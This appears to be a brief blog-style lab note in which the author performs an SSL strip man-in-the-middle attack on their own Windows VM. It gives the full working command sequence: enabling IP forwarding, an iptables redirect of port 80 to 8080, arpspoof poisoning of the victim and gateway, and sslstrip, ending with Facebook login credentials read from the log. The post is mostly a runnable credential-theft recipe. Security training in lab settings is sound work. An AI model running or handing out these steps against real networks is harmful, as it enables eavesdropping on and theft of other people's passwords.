SSL strip

SSL stands for Secure Socket Layer and is responsible for ‘s’ in the https://... (s for secure). SSL means that the data one sends to a website over the internet is encrypted and hence, cannot be read by any other person who may be eavesdropping.

SSL strip is a hacking technique where by an attacker can force a browser to strip the SSL layer and go to an http:// domain instead. Once that is achieved the attacker can eavesdrop and see your data (like username and password on facebook) in plaintext

I did a SSL strip today attack today on a windows VM. Tools used

  1. iptables for IP forwarding
  2. arpspoof for placing my kali machine as the MITM
  3. sslstrip for the actual attack

Commands :

To check if IP forwarding is enabled. ‘0’ means its not

cat /proc/sys/net/ipv4/ip_forward

0

echo 1 > /proc/sys/net/ipv4/ip_forward

1

Setup the IP forwarding using iptables

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

Check gateway IP

route -n


Install and run arpspoof (part of the dsniff package)

sudo apt-get install dsniff

arpspoof -i eth0 -t 10.0.2.4 10.0.2.1

  //10.0.2.4 - IP of the Windows VM

  //10.0.2.1 - IP of the gateway


Install and run sslstrip in new kali terminal window

sudo apt-get install sslstrip

sslstrip -l 8080


Now, open the Windows VM and go to facebook.com. You will notice that the browser takes you to the http:// domain instead of https://. Login with creds (I used johnny kabar)


Check sslstrip logs in new kali terminal window

cat ssltrip.log

And here are the credentials I entered!
